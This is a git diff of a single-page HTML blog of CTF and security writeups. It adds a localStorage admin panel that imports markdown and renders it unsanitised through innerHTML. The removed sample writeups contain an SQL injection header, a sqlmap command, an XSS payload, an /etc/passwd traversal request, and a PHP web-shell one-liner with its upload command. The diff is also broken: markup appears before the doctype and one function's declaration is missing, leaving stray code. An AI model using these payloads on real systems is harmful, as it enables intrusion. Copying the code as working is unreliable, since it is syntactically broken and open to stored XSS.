@@ -1,4 +1,14 @@
-<!DOCTYPE html>
+<div class="admin-actions">
+                <button class="btn" onclick="downloadWriteups()">📥 Export All Writeups</button>
+                <button class="btn btn-secondary" onclick="clearWriteups()">🗑️ Clear All</button>
+                <button class="btn btn-secondary" onclick="showJsonEditor()">✏️ Edit JSON</button>
+            </div>
+
+            <div class="github-sync">
+                <h3>🔗 GitHub Sync</h3>
+                <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                    Automatically load writeups from your GitHub repository's <code>writeups/</code> folder.
+                </p><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -276,6 +286,127 @@
             overflow-x: auto;
         }
 
+        /* Upload Zone */
+        .upload-zone {
+            border: 2px dashed var(--border);
+            border-radius: 0.75rem;
+            padding: 2rem;
+            margin: 2rem 0;
+            text-align: center;
+            background: var(--bg-secondary);
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .upload-zone.dragover {
+            border-color: var(--accent);
+            background: var(--bg-tertiary);
+        }
+
+        .upload-zone:hover {
+            border-color: var(--accent);
+        }
+
+        .upload-icon {
+            font-size: 3rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+
+        .upload-text {
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+        }
+
+        .upload-hint {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        .admin-panel {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 0.75rem;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .admin-title {
+            color: var(--accent);
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+
+        .btn {
+            background: var(--accent);
+            color: var(--bg-primary);
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+
+        .btn:hover {
+            background: var(--accent-dim);
+        }
+
+        .btn-secondary {
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
+        }
+
+        .btn-secondary:hover {
+            background: var(--border);
+        }
+
+        .admin-actions {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+
+        .github-sync {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+
+        .github-sync h3 {
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+
+        .github-input {
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            color: var(--text-primary);
+            padding: 0.5rem;
+            border-radius: 0.25rem;
+            width: 100%;
+            margin: 0.5rem 0;
+        }
+
+        .sync-status {
+            margin-top: 1rem;
+            padding: 0.5rem;
+            border-radius: 0.25rem;
+            display: none;
+        }
+
         /* Footer */
         .footer {
             background: var(--bg-secondary);
@@ -312,87 +443,112 @@
     </style>
 </head>
 <body>
-<!-- Header -->
-<header class="header">
-    <div class="container">
-        <nav class="nav">
-            <a href="#" class="logo">{ CTF Writeups }</a>
-            <ul class="nav-links">
-                <li><a href="#home">Home</a></li>
-                <li><a href="#writeups">Writeups</a></li>
-                <li><a href="#about">About</a></li>
-            </ul>
-        </nav>
-    </div>
-</header>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <nav class="nav">
+                <a href="#" class="logo">{ CTF Writeups }</a>
+                <ul class="nav-links">
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#writeups">Writeups</a></li>
+                    <li><a href="#admin">Admin</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
 
-<!-- Hero Section -->
-<section class="hero" id="home">
-    <div class="container">
-        <h1>Security Research & CTF Writeups</h1>
-        <p>Documenting my journey through cybersecurity challenges, vulnerability research, and real-world attack analysis</p>
-    </div>
-</section>
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="container">
+            <h1>Security Research & CTF Writeups</h1>
+            <p>Documenting my journey through cybersecurity challenges, vulnerability research, and real-world attack analysis</p>
+        </div>
+    </section>
 
-<!-- Filters -->
-<section class="filters">
-    <div class="container">
-        <div class="filter-group">
-            <span class="filter-label">Filter by:</span>
-            <button class="filter-btn active" data-filter="all">All</button>
-            <button class="filter-btn" data-filter="web">Web</button>
-            <button class="filter-btn" data-filter="crypto">Crypto</button>
-            <button class="filter-btn" data-filter="pwn">Pwn</button>
-            <button class="filter-btn" data-filter="forensics">Forensics</button>
-            <button class="filter-btn" data-filter="research">Research</button>
+    <!-- Filters -->
+    <section class="filters">
+        <div class="container">
+            <div class="filter-group">
+                <span class="filter-label">Filter by:</span>
+                <button class="filter-btn active" data-filter="all">All</button>
+                <button class="filter-btn" data-filter="web">Web</button>
+                <button class="filter-btn" data-filter="crypto">Crypto</button>
+                <button class="filter-btn" data-filter="pwn">Pwn</button>
+                <button class="filter-btn" data-filter="forensics">Forensics</button>
+                <button class="filter-btn" data-filter="research">Research</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Writeups -->
+    <section class="writeups" id="writeups">
+        <div class="container">
+            <div class="writeups-grid" id="writeups-grid">
+                <!-- Writeup cards will be populated by JavaScript -->
+            </div>
+        </div>
+    </section>
+
+    <!-- Admin Panel -->
+    <section class="admin-panel" id="admin" style="margin: 3rem auto; max-width: 1200px;">
+        <div class="container">
+            <div class="admin-header">
+                <h2 class="admin-title">📝 Admin Panel</h2>
+            </div>
+            
+            <div class="upload-zone" id="upload-zone">
+                <div class="upload-icon">📁</div>
+                <div class="upload-text">Drag & drop markdown files here</div>
+                <div class="upload-hint">Or click to browse files (.md format)</div>
+                <input type="file" id="file-input" accept=".md" multiple style="display: none;">
+            </div>
+
+            <div class="admin-actions">
+                <button class="btn" onclick="downloadWriteups()">📥 Export All Writeups</button>
+                <button class="btn btn-secondary" onclick="clearWriteups()">🗑️ Clear All</button>
+                <button class="btn btn-secondary" onclick="showJsonEditor()">✏️ Edit JSON</button>
+            </div>
+
+            <div id="status-message" style="margin-top: 1rem; padding: 1rem; border-radius: 0.5rem; display: none;"></div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 CTF Writeups. Built for security research and learning.</p>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal" id="writeup-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button class="modal-close" onclick="closeModal()">&times;</button>
+                <h2 id="modal-title"></h2>
+                <div id="modal-meta"></div>
+            </div>
+            <div class="modal-body" id="modal-body">
+                <!-- Content will be populated by JavaScript -->
+            </div>
         </div>
     </div>
-</section>
 
-<!-- Writeups -->
-<section class="writeups" id="writeups">
-    <div class="container">
-        <div class="writeups-grid" id="writeups-grid">
-            <!-- Writeup cards will be populated by JavaScript -->
-        </div>
-    </div>
-</section>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/9.1.2/marked.min.js"></script>
 
-<!-- Footer -->
-<footer class="footer">
-    <div class="container">
-        <p>&copy; 2025 CTF Writeups. Built for security research and learning.</p>
-    </div>
-</footer>
-
-<!-- Modal -->
-<div class="modal" id="writeup-modal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <button class="modal-close" onclick="closeModal()">&times;</button>
-            <h2 id="modal-title"></h2>
-            <div id="modal-meta"></div>
-        </div>
-        <div class="modal-body" id="modal-body">
-            <!-- Content will be populated by JavaScript -->
-        </div>
-    </div>
-</div>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
-
-<script>
-    // Sample writeup data
-    const writeups = [
-        {
-            id: 1,
-            title: "30-Day Honeypot Experiment: What I Learned",
-            category: "research",
-            event: "Personal Research Project",
-            date: "2025-07-11",
-            excerpt: "Deployed a Cowrie SSH honeypot for 30 days and captured 47,143 attack events from 3,608 unique IPs. Discovered the difference between malicious attacks and legitimate security research.",
-            content: `
+    <script>
+        // Sample writeup data - Load from localStorage if available
+        let writeups = JSON.parse(localStorage.getItem('ctf-writeups')) || [
+            {
+                id: 1,
+                title: "30-Day Honeypot Experiment: What I Learned",
+                category: "research",
+                event: "Personal Research Project",
+                date: "2025-07-11",
+                excerpt: "Deployed a Cowrie SSH honeypot for 30 days and captured 47,143 attack events from 3,608 unique IPs. Discovered the difference between malicious attacks and legitimate security research.",
+                content: `
                     <h2>Introduction</h2>
                     <p>Hello! This is my first blog post, documenting my month-long honeypot experiment. On June 11th, 2025, I decided to set up a honeypot to witness real-world cyberattacks. As a cybersecurity student, it's rare to see genuine attacks outside of controlled lab environments.</p>
 
@@ -415,173 +571,76 @@
 
                     <h3>Attack Patterns</h3>
                     <p>Most attacks were credential stuffing and probing, with a total of 3,736 echo commands to test shell access. The top username attempted was "root", showing that attackers target the most obvious administrative accounts first.</p>
+
+                    <h3>Conclusion</h3>
+                    <p>This honeypot experiment provided invaluable insights into real-world cyber threats. While I initially hoped to see malware installation or botnet recruitment, the reality was more nuanced. Most attackers were cautious and methodical, using sophisticated techniques to avoid detection.</p>
+
+                    <p>The experience taught me that cybersecurity is not just about understanding attacks, but also about distinguishing between different types of network activity and understanding the motivations behind them.</p>
                 `
-        },
-        {
-            id: 2,
-            title: "SQL Injection via User-Agent Header",
-            category: "web",
-            event: "HackTheBox - WebApp Challenge",
-            date: "2025-06-15",
-            excerpt: "Found an interesting SQL injection vulnerability hidden in the User-Agent header parsing. The application was logging user agents to a database without proper sanitization.",
-            content: `
-                    <h2>Challenge Overview</h2>
-                    <p>This web application challenge involved finding and exploiting a SQL injection vulnerability in an unexpected location - the User-Agent header.</p>
+            }
+        ];
 
-                    <h3>Initial Reconnaissance</h3>
-                    <p>The target was a simple login portal with basic functionality. Standard SQL injection attempts on the login form yielded no results, suggesting proper input sanitization on user-facing forms.</p>
+        // DOM elements
+        const writeupsGrid = document.getElementById('writeups-grid');
+        const modal = document.getElementById('writeup-modal');
+        const modalTitle = document.getElementById('modal-title');
+        const modalMeta = document.getElementById('modal-meta');
+        const modalBody = document.getElementById('modal-body');
 
-                    <h3>Discovery</h3>
-                    <p>While testing various attack vectors, I noticed that the application seemed to be logging requests. This led me to investigate whether HTTP headers were being processed and stored in a database.</p>
+        // Current filter
+        let currentFilter = 'all';
 
-                    <pre><code class="language-http">GET /login HTTP/1.1
-Host: target.htb
-User-Agent: ' OR 1=1--</code></pre>
-
-                    <p>Bingo! The application threw a SQL error, revealing that the User-Agent header was being inserted directly into a SQL query without sanitization.</p>
-
-                    <h3>Exploitation</h3>
-                    <p>Using sqlmap with custom headers:</p>
-
-                    <pre><code class="language-bash">sqlmap -u "http://target.htb/login" \\
-    --header="User-Agent: *" \\
-    --level=3 \\
-    --risk=2 \\
-    --batch</code></pre>
-
-                    <p>This successfully identified the injection point and allowed for data extraction from the underlying database.</p>
-
-                    <h3>Key Takeaway</h3>
-                    <p>Always test HTTP headers for injection vulnerabilities, especially in applications that log or process request metadata. Developers often sanitize user input but forget about headers.</p>
-                `
-        },
-        {
-            id: 3,
-            title: "XSS in PDF Generation Service",
-            category: "web",
-            event: "Bug Bounty - Private Program",
-            date: "2025-05-20",
-            excerpt: "Discovered a stored XSS vulnerability in a PDF generation service that was processing HTML content without proper sanitization before converting to PDF.",
-            content: `
-                    <h2>Target Application</h2>
-                    <p>The target was a document management system that allowed users to create and convert documents to PDF format. Users could input HTML content that would be rendered and converted to PDF.</p>
-
-                    <h3>Initial Testing</h3>
-                    <p>I started by testing basic XSS payloads in the HTML input field:</p>
-
-                    <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
-
-                    <p>The payload was filtered out, indicating some form of input sanitization was in place.</p>
-
-                    <h3>Bypass Techniques</h3>
-                    <p>After trying various bypass techniques, I discovered that the application was using a whitelist approach but missed some HTML5 event handlers:</p>
-
-                    <pre><code class="language-html">&lt;svg onload=alert(1)&gt;</code></pre>
-
-                    <p>This payload successfully executed JavaScript during the PDF generation process.</p>
-
-                    <h3>Impact Assessment</h3>
-                    <p>The XSS was particularly dangerous because:</p>
-                    <ul>
-                        <li>It executed in the context of the PDF generation service</li>
-                        <li>Could potentially access internal network resources</li>
-                        <li>The generated PDFs could be shared, spreading the attack</li>
-                    </ul>
-
-                    <h3>Remediation</h3>
-                    <p>The fix involved implementing a proper HTML sanitization library and using a more restrictive Content Security Policy during PDF generation.</p>
-                `
-        },
-        {
-            id: 4,
-            title: "Directory Traversal to RCE",
-            category: "web",
-            event: "CTF Challenge - CyberDefenders",
-            date: "2025-04-10",
-            excerpt: "Exploited a directory traversal vulnerability in a file upload feature to achieve remote code execution by uploading a PHP shell to a predictable location.",
-            content: `
-                    <h2>Challenge Setup</h2>
-                    <p>The challenge presented a web application with file upload functionality that claimed to only allow image uploads.</p>
-
-                    <h3>Initial Analysis</h3>
-                    <p>Testing the upload functionality revealed that it checked file extensions but didn't validate the actual file content. However, uploaded files were stored outside the web root.</p>
-
-                    <h3>Finding the Vulnerability</h3>
-                    <p>While exploring the application, I discovered a directory traversal vulnerability in the file viewing functionality:</p>
-
-                    <pre><code class="language-http">GET /view?file=../../../etc/passwd HTTP/1.1</code></pre>
-
-                    <p>This successfully returned the system's password file, confirming the traversal vulnerability.</p>
-
-                    <h3>Exploitation Chain</h3>
-                    <p>1. Upload a PHP shell disguised as an image:</p>
-
-                    <pre><code class="language-bash">curl -X POST -F "file=@shell.php.png" http://target/upload</code></pre>
-
-                    <p>2. Use directory traversal to access the uploaded shell:</p>
-
-                    <pre><code class="language-http">GET /view?file=../uploads/shell.php.png&cmd=whoami HTTP/1.1</code></pre>
-
-                    <p>3. Execute commands through the shell parameter:</p>
-
-                    <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
-
-                    <h3>Lessons Learned</h3>
-                    <p>This challenge highlighted the importance of:</p>
-                    <ul>
-                        <li>Validating file content, not just extensions</li>
-                        <li>Implementing proper path sanitization</li>
-                        <li>Storing uploads outside the web root with proper access controls</li>
-                    </ul>
-                `
+        // Initialize the page
+        function init() {
+            renderWriteups();
+            setupFilters();
+            setupFileUpload();
+            saveWriteups(); // Save default writeups to localStorage if first time
         }
-    ];
 
-    // DOM elements
-    const writeupsGrid = document.getElementById('writeups-grid');
-    const modal = document.getElementById('writeup-modal');
-    const modalTitle = document.getElementById('modal-title');
-    const modalMeta = document.getElementById('modal-meta');
-    const modalBody = document.getElementById('modal-body');
+        // Save writeups to localStorage
+        function saveWriteups() {
+            localStorage.setItem('ctf-writeups', JSON.stringify(writeups));
+        }
 
-    // Current filter
-    let currentFilter = 'all';
+        // Add new writeup
+        function addWriteup(writeup) {
+            writeup.id = Date.now(); // Simple ID generation
+            writeups.unshift(writeup); // Add to beginning
+            saveWriteups();
+            renderWriteups();
+            showStatus('✅ Writeup added successfully!', 'success');
+        }
 
-    // Initialize the page
-    function init() {
-        renderWriteups();
-        setupFilters();
-    }
+        // Render writeups based on current filter
+        function renderWriteups() {
+            const filteredWriteups = currentFilter === 'all' 
+                ? writeups 
+                : writeups.filter(w => w.category === currentFilter);
 
-    // Render writeups based on current filter
-    function renderWriteups() {
-        const filteredWriteups = currentFilter === 'all'
-            ? writeups
-            : writeups.filter(w => w.category === currentFilter);
+            writeupsGrid.innerHTML = '';
 
-        writeupsGrid.innerHTML = '';
+            filteredWriteups.forEach(writeup => {
+                const card = createWriteupCard(writeup);
+                writeupsGrid.appendChild(card);
+            });
+        }
 
-        filteredWriteups.forEach(writeup => {
-            const card = createWriteupCard(writeup);
-            writeupsGrid.appendChild(card);
-        });
-    }
+        // Create a writeup card element
+        function createWriteupCard(writeup) {
+            const card = document.createElement('div');
+            card.className = 'writeup-card';
+            card.onclick = () => openModal(writeup);
 
-    // Create a writeup card element
-    function createWriteupCard(writeup) {
-        const card = document.createElement('div');
-        card.className = 'writeup-card';
-        card.onclick = () => openModal(writeup);
+            const categoryColors = {
+                web: '#ff6b6b',
+                crypto: '#4ecdc4',
+                pwn: '#45b7d1',
+                forensics: '#96ceb4',
+                research: '#ffeaa7'
+            };
 
-        const categoryColors = {
-            web: '#ff6b6b',
-            crypto: '#4ecdc4',
-            pwn: '#45b7d1',
-            forensics: '#96ceb4',
-            research: '#ffeaa7'
-        };
-
-        card.innerHTML = `
+            card.innerHTML = `
                 <div class="writeup-meta">
                     <span class="writeup-category" style="background-color: ${categoryColors[writeup.category] || '#00d4aa'}">${writeup.category.toUpperCase()}</span>
                     <span class="writeup-date">${formatDate(writeup.date)}</span>
@@ -591,84 +650,243 @@ User-Agent: ' OR 1=1--</code></pre>
                 <p class="writeup-excerpt">${writeup.excerpt}</p>
             `;
 
-        return card;
-    }
+            return card;
+        }
 
-    // Setup filter buttons
-    function setupFilters() {
-        const filterBtns = document.querySelectorAll('.filter-btn');
-        filterBtns.forEach(btn => {
-            btn.addEventListener('click', () => {
-                // Remove active class from all buttons
-                filterBtns.forEach(b => b.classList.remove('active'));
-                // Add active class to clicked button
-                btn.classList.add('active');
-                // Update current filter
-                currentFilter = btn.dataset.filter;
-                // Re-render writeups
-                renderWriteups();
+        // Setup file upload functionality
+        function setupFileUpload() {
+            const uploadZone = document.getElementById('upload-zone');
+            const fileInput = document.getElementById('file-input');
+
+            // Handle drag and drop
+            uploadZone.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                uploadZone.classList.add('dragover');
             });
-        });
-    }
 
-    // Open modal with writeup content
-    function openModal(writeup) {
-        modalTitle.textContent = writeup.title;
-        modalMeta.innerHTML = `
+            uploadZone.addEventListener('dragleave', (e) => {
+                e.preventDefault();
+                uploadZone.classList.remove('dragover');
+            });
+
+            uploadZone.addEventListener('drop', (e) => {
+                e.preventDefault();
+                uploadZone.classList.remove('dragover');
+                const files = Array.from(e.dataTransfer.files);
+                handleFiles(files);
+            });
+
+            // Handle click to browse
+            uploadZone.addEventListener('click', () => {
+                fileInput.click();
+            });
+
+            fileInput.addEventListener('change', (e) => {
+                const files = Array.from(e.target.files);
+                handleFiles(files);
+            });
+        }
+
+        // Handle uploaded files
+        function handleFiles(files) {
+            const mdFiles = files.filter(file => file.name.endsWith('.md'));
+            
+            if (mdFiles.length === 0) {
+                showStatus('❌ Please upload .md (markdown) files only', 'error');
+                return;
+            }
+
+            mdFiles.forEach(file => {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const markdown = e.target.result;
+                    const writeup = parseMarkdownToWriteup(markdown, file.name);
+                    if (writeup) {
+                        addWriteup(writeup);
+                    }
+                };
+                reader.readAsText(file);
+            });
+        }
+
+        // Parse markdown file to writeup object
+        function parseMarkdownToWriteup(markdown, filename) {
+            try {
+                // Extract frontmatter (metadata between ---)
+                const frontmatterRegex = /^---\s*\n([\s\S]*?)\n---\s*\n([\s\S]*)$/;
+                const match = markdown.match(frontmatterRegex);
+                
+                let metadata = {};
+                let content = markdown;
+
+                if (match) {
+                    // Parse YAML-like frontmatter
+                    const frontmatter = match[1];
+                    const body = match[2];
+                    
+                    frontmatter.split('\n').forEach(line => {
+                        const [key, ...valueParts] = line.split(':');
+                        if (key && valueParts.length) {
+                            metadata[key.trim()] = valueParts.join(':').trim().replace(/['"]/g, '');
+                        }
+                    });
+                    
+                    content = body;
+                }
+
+                // Extract title from first h1 or use filename
+                const titleMatch = content.match(/^#\s+(.+)$/m);
+                const title = metadata.title || (titleMatch ? titleMatch[1] : filename.replace('.md', ''));
+
+                // Extract excerpt from first paragraph
+                const paragraphs = content.split('\n\n').filter(p => p.trim() && !p.startsWith('#'));
+                const excerpt = metadata.excerpt || (paragraphs[0] ? paragraphs[0].replace(/\n/g, ' ').substring(0, 150) + '...' : '');
+
+                // Convert markdown to HTML
+                const htmlContent = marked.parse(content);
+
+                return {
+                    title: title,
+                    category: metadata.category || 'web',
+                    event: metadata.event || 'CTF Challenge',
+                    date: metadata.date || new Date().toISOString().split('T')[0],
+                    excerpt: excerpt,
+                    content: htmlContent
+                };
+            } catch (error) {
+                showStatus(`❌ Error parsing ${filename}: ${error.message}`, 'error');
+                return null;
+            }
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status-message');
+            statusDiv.textContent = message;
+            statusDiv.style.display = 'block';
+            statusDiv.style.backgroundColor = type === 'success' ? '#155724' : '#721c24';
+            statusDiv.style.color = type === 'success' ? '#d4edda' : '#f8d7da';
+            statusDiv.style.border = type === 'success' ? '1px solid #c3e6cb' : '1px solid #f5c6cb';
+            
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 3000);
+        }
+
+        // Download all writeups as JSON
+        function downloadWriteups() {
+            const dataStr = JSON.stringify(writeups, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = 'ctf-writeups-backup.json';
+            link.click();
+            URL.revokeObjectURL(url);
+            showStatus('📥 Writeups exported successfully!', 'success');
+        }
+
+        // Clear all writeups
+        function clearWriteups() {
+            if (confirm('Are you sure you want to delete all writeups? This cannot be undone.')) {
+                writeups.length = 0;
+                saveWriteups();
+                renderWriteups();
+                showStatus('🗑️ All writeups cleared', 'success');
+            }
+        }
+
+        // Show JSON editor
+        function showJsonEditor() {
+            const jsonStr = JSON.stringify(writeups, null, 2);
+            const newJson = prompt('Edit writeups JSON (be careful!):', jsonStr);
+            
+            if (newJson && newJson !== jsonStr) {
+                try {
+                    const parsed = JSON.parse(newJson);
+                    writeups.length = 0;
+                    writeups.push(...parsed);
+                    saveWriteups();
+                    renderWriteups();
+                    showStatus('✏️ JSON updated successfully!', 'success');
+                } catch (error) {
+                    showStatus('❌ Invalid JSON format', 'error');
+                }
+            }
+        }
+            const filterBtns = document.querySelectorAll('.filter-btn');
+            filterBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    // Remove active class from all buttons
+                    filterBtns.forEach(b => b.classList.remove('active'));
+                    // Add active class to clicked button
+                    btn.classList.add('active');
+                    // Update current filter
+                    currentFilter = btn.dataset.filter;
+                    // Re-render writeups
+                    renderWriteups();
+                });
+            });
+        }
+
+        // Open modal with writeup content
+        function openModal(writeup) {
+            modalTitle.textContent = writeup.title;
+            modalMeta.innerHTML = `
                 <div style="display: flex; gap: 1rem; margin-top: 0.5rem; align-items: center;">
                     <span class="writeup-category" style="font-size: 0.8rem;">${writeup.category.toUpperCase()}</span>
                     <span class="writeup-event" style="color: var(--accent);">${writeup.event}</span>
                     <span class="writeup-date" style="color: var(--text-secondary);">${formatDate(writeup.date)}</span>
                 </div>
             `;
-        modalBody.innerHTML = writeup.content;
-        modal.style.display = 'block';
-        document.body.style.overflow = 'hidden';
-
-        // Re-run Prism highlighting on new content
-        if (window.Prism) {
-            Prism.highlightAllUnder(modalBody);
-        }
-    }
-
-    // Close modal
-    function closeModal() {
-        modal.style.display = 'none';
-        document.body.style.overflow = 'auto';
-    }
-
-    // Format date
-    function formatDate(dateString) {
-        const date = new Date(dateString);
-        return date.toLocaleDateString('en-US', {
-            year: 'numeric',
-            month: 'short',
-            day: 'numeric'
-        });
-    }
-
-    // Close modal when clicking outside
-    window.onclick = function(event) {
-        if (event.target === modal) {
-            closeModal();
-        }
-    }
-
-    // Smooth scrolling for navigation links
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener('click', function (e) {
-            e.preventDefault();
-            const target = document.querySelector(this.getAttribute('href'));
-            if (target) {
-                target.scrollIntoView({
-                    behavior: 'smooth'
-                });
+            modalBody.innerHTML = writeup.content;
+            modal.style.display = 'block';
+            document.body.style.overflow = 'hidden';
+            
+            // Re-run Prism highlighting on new content
+            if (window.Prism) {
+                Prism.highlightAllUnder(modalBody);
             }
-        });
-    });
+        }
 
-    // Initialize the page when DOM is loaded
-    document.addEventListener('DOMContentLoaded', init);
-</script>
+        // Close modal
+        function closeModal() {
+            modal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Format date
+        function formatDate(dateString) {
+            const date = new Date(dateString);
+            return date.toLocaleDateString('en-US', { 
+                year: 'numeric', 
+                month: 'short', 
+                day: 'numeric' 
+            });
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // Initialize the page when DOM is loaded
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
 </body>
 </html>
